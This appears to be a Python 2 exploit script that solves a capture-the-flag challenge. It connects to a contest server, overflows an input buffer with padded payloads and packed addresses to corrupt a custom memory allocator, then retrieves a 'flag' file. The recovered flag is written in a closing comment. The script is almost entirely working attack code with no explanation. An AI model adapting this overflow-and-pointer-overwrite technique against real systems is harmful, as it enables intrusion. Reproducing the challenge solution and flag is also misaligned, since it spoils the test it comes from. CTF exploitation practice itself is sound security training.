import socket, struct
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    return res[:-(len(s))]
    
def x(n):
    return struct.pack("<Q", n)

# sc = socket.create_connection(("10.0.0.97", 12345))
sc = socket.create_connection(("cthulhu.fluxfingers.net", 1509))

sc.send("language\n")
sc.send("xxxx\n")
sc.send("language\n")
sc.send("zzzzzzzzzzzzzzzz\n")
sc.send("get\n")
sc.send("xxxx\x00".ljust(8191, "q") + x(0x0000000000601F20-1) + "\n")
sc.send("language\n")
sc.send("xxxx\n")
sc.send("get\n")
sc.send("zzzzzzzzzzzzzzzz\x00".ljust(8191, "q") + "\x03" + "\n")
sc.send("language\n")
sc.send(x(0x0000000000601EF0) + "\n")
sc.send("get\n")
sc.send("//////////////////////////////////flag\n")

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    
# flag{cthulhu_likes_custom_mallocators}
